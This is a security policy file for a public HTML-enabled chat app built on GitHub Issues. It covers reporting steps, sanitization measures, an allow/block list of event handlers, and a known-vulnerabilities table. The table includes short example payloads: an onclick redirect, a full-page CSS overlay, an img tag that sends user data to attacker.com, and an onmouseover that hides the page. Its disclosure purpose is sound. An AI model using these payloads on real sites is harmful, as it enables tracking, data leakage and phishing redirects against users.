# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 1.0.x   | :white_check_mark: |

## Reporting a Vulnerability

We take security vulnerabilities seriously. If you discover a security vulnerability in GitHub Chat, please report it to us in a responsible manner.

### How to Report

1. **DO NOT** open a public issue for security vulnerabilities
2. Send an email to the repository owner with:
   - Description of the vulnerability
   - Steps to reproduce the issue
   - Potential impact
   - Suggested fix (if available)

### Security Measures

This application implements several security measures:

1. **Input Sanitization**: HTML content is sanitized to prevent XSS attacks
2. **Event Handler Filtering**: Auto-executing events (onload, onerror, etc.) are blocked
3. **User Interaction Only**: Only user-triggered events (onclick) are permitted
4. **JavaScript URL Blocking**: javascript: URLs are filtered out
5. **Rate Limiting**: GitHub API rate limits are respected
6. **Environment Variables**: Sensitive data is stored in environment variables
7. **Content Security Policy**: CSP headers help prevent injection attacks
8. **HTTPS Only**: All communications are encrypted

### Allowed vs Blocked Events

**✅ Allowed (Safe User Interactions):**
- `onclick` - User must click to trigger
- `onmouseover`, `onmouseout` - Safe hover animations and effects
- `onmousedown`, `onmouseup`, `onmousemove` - Mouse interaction events

**❌ Blocked (Auto-executing/Dangerous):**
- `onload`, `onerror` - Execute automatically when page/element loads
- `onfocus`, `onblur` - Execute on element focus changes  
- `onchange`, `onsubmit` - Execute on form interactions
- `onkeydown`, `onkeyup` - Execute on keyboard input
- `onresize`, `onscroll` - Execute on window/page changes
- Drag, touch, and animation completion events

### Security Best Practices for Users

1. **Be cautious with HTML content**: This chat allows HTML, so be careful with untrusted content
2. **Don't share sensitive information**: This is a public chat system
3. **Report suspicious activity**: Contact administrators if you notice unusual behavior

### Known Security Considerations

1. **HTML content with safe interactions** - Mouse events for animations allowed, auto-executing events blocked
2. **GitHub Issues are public** - All messages are visible to anyone
3. **Admin commands are restricted** - Only authorized users can execute admin commands
4. **Interactive content verification** - Users should verify authenticity of interactive elements before engaging

## Known Vulnerabilities

### High Risk

**V001: Social Engineering via Interactive Content**
- **Description**: Malicious users can create convincing fake buttons or links that appear legitimate
- **Example**: Button labeled "GitHub Login" that actually links to a phishing site
- **Impact**: Users may be tricked into clicking malicious content
- **Mitigation**: Users should verify URLs before clicking, hover to check destinations
- **Status**: Accepted risk - user education required

**V002: Clickjacking Potential**
- **Description**: Malicious onclick events can execute arbitrary JavaScript when users click
- **Example**: `onclick="window.location='http://malicious-site.com'"`
- **Impact**: Users can be redirected to malicious websites
- **Mitigation**: User awareness, verify button authenticity before clicking
- **Status**: Accepted risk - inherent to allowing onclick events

### Medium Risk

**V003: CSS-based Attacks**
- **Description**: Malicious CSS in style attributes could create overlay attacks or hide content
- **Example**: `style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; background:white;"`
- **Impact**: UI manipulation, content hiding, fake overlays
- **Mitigation**: CSS sanitization not implemented - users should be cautious
- **Status**: Known limitation

**V004: Data Exfiltration via External Resources**
- **Description**: Images and external resources can be used to track users or exfiltrate data
- **Example**: `<img src="http://attacker.com/track?user=victim&data=sensitive">`
- **Impact**: User tracking, potential data leakage through URL parameters
- **Mitigation**: External resource loading inherent to HTML - user awareness needed
- **Status**: Accepted risk

**V005: DOM Manipulation via Mouse Events**
- **Description**: onmouseover/onmouseout events can manipulate page content beyond intended scope
- **Example**: `onmouseover="document.body.style.display='none'"`
- **Impact**: Page manipulation, content hiding, user experience disruption
- **Mitigation**: Limited by browser security model, page refresh recovers
- **Status**: Accepted risk for animation functionality

### Low Risk

**V006: Content Injection via Markdown**
- **Description**: Markdown processing might allow unexpected HTML through conversion edge cases
- **Example**: Complex markdown that bypasses HTML sanitization
- **Impact**: Potential XSS if sanitization is bypassed
- **Mitigation**: Dual-layer sanitization (server + client), regular security reviews
- **Status**: Monitored

**V007: GitHub API Rate Limit DoS**
- **Description**: Excessive refresh requests could exhaust GitHub API rate limits
- **Example**: Automated scripts hitting refresh repeatedly
- **Impact**: Service degradation, temporary unavailability
- **Mitigation**: Client-side rate limiting, user education
- **Status**: Low impact

**V008: Browser Storage Poisoning**
- **Description**: Service Worker cache could be poisoned with malicious content
- **Example**: Cached malicious API responses served when offline
- **Impact**: Persistent malicious content display
- **Mitigation**: Cache versioning, cache invalidation on updates
- **Status**: Low probability

## Vulnerability Disclosure Timeline

### Planned Security Reviews
- **Monthly**: Review admin user list and permissions
- **Quarterly**: Audit dangerous event handler blocklist
- **Bi-annually**: Full security assessment and penetration testing
- **Annually**: Third-party security audit (if resources available)

### Response Timeline
- **Critical vulnerabilities**: 24-48 hours
- **High vulnerabilities**: 1 week
- **Medium vulnerabilities**: 1 month
- **Low vulnerabilities**: Next major release

## Security Assumptions

This system assumes:
1. Users will exercise caution with interactive content
2. GitHub's infrastructure security (we rely on GitHub Issues/Pages)
3. Browser security model effectiveness
4. Admin users are trustworthy and properly secured
5. Users understand this is a public chat system

## Recommendations for Users

### Before Clicking Any Interactive Element:
1. **Verify the source** - Check who posted the content
2. **Inspect URLs** - Hover over links to see destinations
3. **Be suspicious of urgent requests** - "Click here immediately" is often malicious
4. **Don't enter sensitive information** - This is a public chat system
5. **Report suspicious content** - Contact administrators for concerning posts

### For Administrators:
1. **Monitor for abuse** - Regularly review chat content
2. **Rotate tokens** - Change GitHub tokens periodically
3. **Limit admin access** - Only trusted users should have admin privileges
4. **Keep updated** - Apply security updates promptly
5. **Backup regularly** - Maintain chat data backups

## Updates

Security updates will be published as new releases. Please keep your deployment up to date.